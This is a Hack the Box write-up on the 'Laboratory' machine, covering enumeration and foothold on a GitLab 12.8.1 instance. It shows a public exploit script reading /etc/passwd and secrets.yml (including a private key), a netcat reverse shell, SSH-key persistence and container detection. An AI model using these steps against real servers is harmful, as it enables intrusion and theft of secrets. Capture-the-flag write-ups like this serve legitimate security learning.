---
description: >-
  Zweilosec's writeup on the easy-difficulty machine Laboratory from
  https://hackthebox.eu
title: Hack the Box - Laboratory Writeup
date: 2021-03-19 08:00:00 -0600
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, redteam, linux, web, git, ssh, binary analysis, easy, writeup, egotisticalsw, felamos]     # TAG names should always be lowercase
show_image_post: true
image: /assets/img/laboratory-0-infocard.png
---

## HTB - Laboratory

## Overview

![Descriptive information card showing machine statistics](/assets/img/laboratory-0-infocard.png)

This easy-difficulty Linux machine had an interesting take on a common use of a docker container.  Installing a GitLab instance and storing sensitive code in it are likely uses that can be found in many setups.  The user of the machine thought they had set this up with impenetrable security, but was overconfident and made a series of simple mistakes that led to the machine's compromise.  

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.216`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ nmap -sCV -n -p- -Pn -v -oA laboratory 10.10.10.216                                             1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 19:40 EDT

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName=laboratory.htb
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c
|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 123.92 seconds
```

After nmap finished scanning, I noticed that there were only three ports open, 22 - SSH, 80 - HTTP, and 443 - HTTPS.

### Port 80 - HTTP

![The navigation was redirected to the domain laboratory.htb automatically](/assets/img/laboratory-1-laboratory.png)

Since there were so few open ports to work with I decided to start with port 80.  I navigated to the machine's IP in my browser, but was automatically redirected to the domain `https://laboratory.htb`.  I added this domain to my `/etc/hosts` file and tried again.

### port 443 - HTTPS

![Screenshot of a security laboratory website](/assets/img/laboratory-2-lab-S.png)

Since navigating to port 80 automatically redirected to HTTPS we were automatically enumerating port 443 instead.  The page that loaded was the laboratory page for a security company that offered a number of different services.

![Screenshot of the services offered by this website](/assets/img/laboratory-3-best-security.png)

The team's (overexaggerated) secure development skills purported to offer a guaranteed "100% unhackable" software package. They also were apparently cryptographic masters as well.

> "We know all the great crypto, like ROT13 and Base64." :laughing:

![The CEO of the company was named Dexter](/assets/img/laboratory-4-dexter.png)

Further down the page I found a few potential usenames `Dexter`, `dee dee`, and `Anonymous` and added them to my list.  (You never know!)

![Navigation menu links hidden in the source code of the page](/assets/img/laboratory-5-menu.png)

In the source code of the page there was an HTML menu that was commented out that listed a couple more pages that were not visible.  I decided to check them to see if the pages were actually there, but neither seemed to exist.

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ gobuster vhost -u https://laboratory.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://laboratory.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/03/16 21:24:29 Starting gobuster in VHOST enumeration mode
===============================================================
Error: error on running gobuster: unable to connect to https://laboratory.htb/: invalid certificate: x509: certificate is valid for git.laboratory.htb, not laboratory.htb
```

I got back a very interesting error when scanning for vhosts that said it was "unable to connect" due to a certificate that was valid for `git.laboratory.htb` rather than `laboratory.htb`.  

![The HTTPS Certificate showing an alternate DNS name](/assets/img/laboratory-1-certificate.png)

I checked the certificate in the browser and sure enough there was a 'Subject Alt Names' field with a DNS Name value of `git.laboratory.htb`.  I added this domain to `/etc/hosts` and tried to connect. 

![looking back at my nmap scan, I realized that this was in the results](/assets/markups/laboratory-git.svg)

### The git repository

![A login page for a locally stored GitLab repository](/assets/img/laboratory-6-gitlab.png)

Navigating to the site `git.laboratory.htb` led me to a GitLab Community Edition login page.  This must have been a locally stored GitLab instance.

![Registering for a new account on the site required using an email that ended in @laboratory.htb](/assets/img/laboratory-7-users.png)

I tried a few basic username and password combinations, but did not get in.  Next I tried to do a password reset using the potential username `Dexter` but I would have had to have access to the user's email inbox to do anything with it.  After that I registered for a new account.

![I got lucky](/assets/markups/laboratory-gitlab.svg)

![A repository for a 100% unhackable website](/assets/img/laboratory-8-git-projects.png)

On the Projects page under the 'Explore projects' tab I found the git repository for the "100% unhackable" website.  This looked like something I would have to explore and test.  The user's full name was also visible, which I took note of in case I needed it to generate usernames later.

![In the contributors tab found Dexter's email address](/assets/img/laboratory-9-dexter.png)

On the page `https://git.laboratory.htb/dexter/securewebsite/-/graphs/master` under Contributors I found the email address `dexter@laboratory.htb`.


![The user Seven posts an issue about a 418 HTTP error](/assets/img/laboratory-7-seven-issue.png)
 
On the Issues page I found an issue that was opened by the user "Seven" who complains about an HTTP 418 error when cloning and testing locally.  I added this name to my potential username list and looked up what an error code 418 was since I didn't recognize it.  Turns out it was an April Fools joke...
 
* https://en.wikipedia.org/wiki/Hyper_Text_Coffee_Pot_Control_Protocol
 
> Despite the joking nature of its origins, or perhaps because of it, the protocol has remained as a minor presence online. The editor Emacs includes a fully functional client side implementation of it,

![The user Seven only had one contribution ever](/assets/img/laboratory-9-seven.png)

Seven didn't seem to be a very active contributor on the site.  This just seemed to be a little rabbit egg the author put in.

### GitLab RCE

![The help page showed the version number of GitLab](/assets/img/laboratory-10-help.png)

On the Help page I found the version of GitLab was "GitLab Community Edition 12.8.1". There was also a link for checking the current instance configuration.  I did some research to see if there were any vulnerabilities associated with this version of GitLab and found a remote code execution vulnerability for versions 12.4.0 - 12.8.1.


* https://github.com/dotPY-hax/gitlab_RCE

![Fixing the proof of concept code](/assets/img/laboratory-11-exploit-fix.png)

The exploit was quite easy to use, though it required minor modification (this instance of GitLab requires an `@laboratory.htb` email address). 

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ python3 gitlab_rce.py https://git.laboratory.htb:443 10.10.14.161
Gitlab Exploit by dotPY [insert fancy ascii art]
registering ViFFvMAIkc:DJMVK91u0L - 200
Getting version of https://git.laboratory.htb:443 - 200
The Version seems to be 12.8.1! Choose wisely
delete user ViFFvMAIkc - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 1
Start a listener on port 42069 and hit enter (nc -vlnp 42069)
please type in the fully qualified path of the file you want to LFI. Uses /etc/passwd when left empty: 
registering WGD3syA0jE:jWw0hKdIoY - 200
creating project CxkO8dFaDg - 200
creating project IHNxtcHE6l - 200
creating issue IZ8nDhKsw4 for project CxkO8dFaDg - 200
moving issue from CxkO8dFaDg to IHNxtcHE6l - 200
Grabbing file passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

delete user WGD3syA0jE - 200
```

I first used the exploit to pull `/etc/passwd` so I could see what users were available and to test the LFI vulnerability.  There were a few users related to git and a few others that could log in.

## Initial Foothold

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ python3 gitlab_rce.py https://git.laboratory.htb:443 10.10.14.161
Gitlab Exploit by dotPY [insert fancy ascii art]
registering o3JFRVPlRk:8gPaPDFWSU - 200
Getting version of https://git.laboratory.htb:443 - 200
The Version seems to be 12.8.1! Choose wisely
delete user o3JFRVPlRk - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 2
Start a listener on port 42069 and hit enter (nc -vlnp 42069)
registering CPYR8ZFd1I:2Rj3a93rQj - 200
creating project KHjH1fCBai - 200
creating project poGM0Q7jYf - 200
creating issue Sc18pxgzJb for project KHjH1fCBai - 200
moving issue from KHjH1fCBai to poGM0Q7jYf - 200
Grabbing file secrets.yml
deploying payload - 500
delete user CPYR8ZFd1I - 200
```

Next I chose option two to see what kind of remote code options I was given

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ nc -lvnp 42069
listening on [any] 42069 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.10.216] 40008
id
uid=998(git) gid=998(git) groups=998(git)
```

The script simply said that it was grabbing `secrets.yml`, but then to my surprise it actually sent me a reverse shell despite the warning.  I was logged in as `git`.

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ nc -lvnp 42069                                                                                255 ⨯
listening on [any] 42069 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.10.216] 40008
id
uid=998(git) gid=998(git) groups=998(git)
ruby -e 'exec "/bin/bash"'
pwd 
/var/opt/gitlab/gitlab-rails/working
ls -la
total 8
drwx------ 2 git root 4096 Jul  2  2020 .
drwxr-xr-x 9 git root 4096 Mar 17 19:41 ..
cd ..
ls -la
total 8
drwx------ 2 git root 4096 Jul  2  2020 .
drwxr-xr-x 9 git root 4096 Mar 17 19:41 ..
cd ..
ls -la
total 8
drwx------ 2 git root 4096 Jul  2  2020 .
drwxr-xr-x 9 git root 4096 Mar 17 19:41 ..
pwd
/var/opt/gitlab/gitlab-rails/working
which python
which python3
/opt/gitlab/embedded/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
ls -la /home
id
exit
ls
exit
^C
```

The shell it gave me seemed limited and didn't upgrade like I had hoped. It died after I tried.  I tried again and again using different languages, but they all failed as well.

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ python3 gitlab_rce.py https://git.laboratory.htb:443 10.10.14.161
Gitlab Exploit by dotPY [insert fancy ascii art]
registering t0B3sPEXbn:EPuhXdTqjL - 200
Getting version of https://git.laboratory.htb:443 - 200
The Version seems to be 12.8.1! Choose wisely
delete user t0B3sPEXbn - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 1
Start a listener on port 42069 and hit enter (nc -vlnp 42069)
please type in the fully qualified path of the file you want to LFI. Uses /etc/passwd when left empty: /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
registering NiPjQwEeos:iCh1uEnvzQ - 200
creating project Vx5RFZEd2n - 200
creating project m02yfaqljh - 200
creating issue xHn4vmO40Y for project Vx5RFZEd2n - 200
moving issue from Vx5RFZEd2n to m02yfaqljh - 200
Grabbing file secrets.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----


delete user NiPjQwEeos - 200
```

Since the shell was limited, I decided to use option 'one' to retrieve this `secrets.yml` file that it mentioned in the other mode that gave me a shell.  I wasn't sure what these keys for used for, so I looked it up in the GitLab documentation. 

* https://docs.gitlab.com/ee/development/application_secrets.html

> ```text
> Secret entries
> Entry	                       Description
> secret_key_base	             The base key to be used for generating a various secrets
> otp_key_base	               The base key for One Time Passwords, described in User management
> db_key_base	                 The base key to encrypt the data for attr_encrypted columns
> openid_connect_signing_key	 The singing key for OpenID Connect
> encrypted_settings_key_base	 The base key to encrypt settings files with
> ```

AFter a little more reading, I found that there was a metasploit module that exploited the same vulnerability.  It described the use of these keys as:

> ```
> 'Description' => %q{
          This module provides remote code execution against GitLab Community
          Edition (CE) and Enterprise Edition (EE). It combines an arbitrary file
          read to extract the Rails "secret_key_base", and gains remote code
          execution with a deserialization vulnerability of a signed
          'experimentation_subject_id' cookie that GitLab uses internally for A/B
          testing.
> ```

* https://about.gitlab.com/releases/2020/03/26/security-release-12-dot-9-dot-1-released/
		  
* https://thecyberpost.com/tools/exploits-cve/gitlab-file-read-remote-code-execution/

With this information I could probably exploit it myself, but I was pressed for time the day I did this machine.

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ bash
zweilos@kalimaa:~/htb/laboratory$ nc -lvnp 42069
listening on [any] 42069 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.10.216] 40222
ls -la ~
total 96
drwxr-xr-x 20 root              root       4096 Mar 17 19:41 .
drwxr-xr-x  1 root              root       4096 Feb 24  2020 ..
drwxr-xr-x  2 git               git        4096 Jul  2  2020 .bundle
-rw-r--r--  1 git               git         367 Jul  2  2020 .gitconfig
drwx------  2 git               git        4096 Jul  2  2020 .ssh
drwxr-x---  3 gitlab-prometheus root       4096 Mar 17 19:41 alertmanager
drwx------  2 git               root       4096 Jul  2  2020 backups
-rw-------  1 root              root         38 Jul  2  2020 bootstrapped
drwx------  3 git               root       4096 Jul  2  2020 git-data
drwx------  3 git               root       4096 Mar 17 19:42 gitaly
drwxr-xr-x  3 git               root       4096 Jul  2  2020 gitlab-ci
drwxr-xr-x  2 git               root       4096 Mar 17 19:41 gitlab-exporter
drwxr-xr-x  9 git               root       4096 Mar 17 19:41 gitlab-rails
drwx------  2 git               root       4096 Mar 17 19:41 gitlab-shell
drwxr-x---  2 git               gitlab-www 4096 Mar 17 19:41 gitlab-workhorse
drwx------  4 gitlab-prometheus root       4096 Oct 20 18:28 grafana
drwx------  3 root              root       4096 Mar 17 22:51 logrotate
drwxr-x---  9 root              gitlab-www 4096 Mar 17 19:41 nginx
drwx------  2 gitlab-psql       root       4096 Mar 17 19:41 postgres-exporter
drwxr-xr-x  3 gitlab-psql       root       4096 Mar 17 19:41 postgresql
drwxr-x---  4 gitlab-prometheus root       4096 Mar 17 19:41 prometheus
-rw-r--r--  1 root              root        226 Mar 17 19:41 public_attributes.json
drwxr-x---  2 gitlab-redis      git        4096 Mar 17 23:37 redis
-rw-r--r--  1 root              root         40 Jul  2  2020 trusted-certs-directory-hash
ls -la ~/.ssh
total 8
drwx------  2 git  git  4096 Jul  2  2020 .
drwxr-xr-x 20 root root 4096 Mar 17 19:41 ..
-rw-------  1 git  git     0 Jul  2  2020 authorized_keys
```

Instead of using the metasploit module, I decided to look around a little bit more using the shell I had. I checked `git`'s home directory and found an `authorized_keys` file in the `.ssh` folder.  

```
echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCowiSu6DfQlcRvE9a1pHlsFMPWFy3Zc1xWPiPbqCNFr07DCzslBt6X3/FeU017C58b1mGvCIKTpecfo9o1cCw0=' >> ~/.ssh/authorized_keys
```

I tried copying my public key to the `authorized_keys` file.

```
┌──(zweilos㉿kalimaa)-[~/htb/laboratory]
└─$ ssh git@10.10.10.216 -i git.key
The authenticity of host '10.10.10.216 (10.10.10.216)' can't be established.
ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.216' (ECDSA) to the list of known hosts.
git@10.10.10.216: Permission denied (publickey).

```

However I wasn't able to SSH into the machine.

```
cat ~/.ssh/authorized_keys
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCowiSu6DfQlcRvE9a1pHlsFMPWFy3Zc1xWPiPbqCNFr07DCzslBt6X3/FeU017C58b1mGvCIKTpecfo9o1cCw0=
ip a
ifconfig
pwd
/var/opt/gitlab/gitlab-rails/working
uname -a
Linux git.laboratory.htb 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

I verified that I had echo'd the key correctly and that it was there, then tried to figure out what the ip of the machine I was on to see if I was incorrect, but was unable.  Thinking back to `/etc/passwd` I thought it was odd that the user folders were all in `/var/opt/gitlab/`.  I was starting to think that I was not on the main machine, but a VM or container instead.  I did a little research into how to figure out if I was in a container, and found an article that talked about this with docker.

* https://tuhrig.de/how-to-know-you-are-inside-a-docker-container/

```bash
awk -F/ '$2 == "docker"' /proc/self/cgroup | read
```

I tried running the command suggested in the blog post, but this returned nothing...which didn't really tell me much.  It could have been some sort of wierd jail on this machine for all I could tell so far.

```
ls -la /root
ls -la /
total 88
drwxr-xr-x   1 root root 4096 Jul  2  2020 .
drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv
-rw-r--r--   1 root root  157 Feb 24  2020 RELEASE
drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  340 Mar 17 19:41 dev
drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
drwxr-xr-x   2 root root 4096 Apr 12  2016 home
drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
drwxr-xr-x   2 root root 4096 Feb 12  2020 lib64
drwxr-xr-x   2 root root 4096 Feb 12  2020 media
drwxr-xr-x   2 root root 4096 Feb 12  2020 mnt
drwxr-xr-x   1 root root 4096 Feb 24  2020 opt
dr-xr-xr-x 303 root root    0 Mar 17 19:41 proc
drwx------   1 root root 4096 Jul 17  2020 root
drwxr-xr-x   1 root root 4096 Mar 17 19:41 run
drwxr-xr-x   1 root root 4096 Feb 21  2020 sbin
drwxr-xr-x   2 root root 4096 Feb 12  2020 srv
dr-xr-xr-x  13 root root    0 Mar 17 19:41 sys
drwxrwxrwt   1 root root 4096 Mar 17 19:42 tmp
drwxr-xr-x   1 root root 4096 Feb 12  2020 usr
drwxr-xr-x   1 root root 4096 Feb 12  2020 var
```

I found what I was looking for in the `/` directory.  The presence of the `.dockerenv` file told me that I was in a docker container.

```
cat /proc/self/cgroup
12:hugetlb:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
11:rdma:/
10:blkio:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
9:perf_event:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
8:net_cls,net_prio:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
7:freezer:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
6:pids:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
5:cpuset:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
4:memory:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
3:cpu,cpuacct:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
2:devices:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
1:name=systemd:/docker/dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
0::/system.slice/containerd.service
```

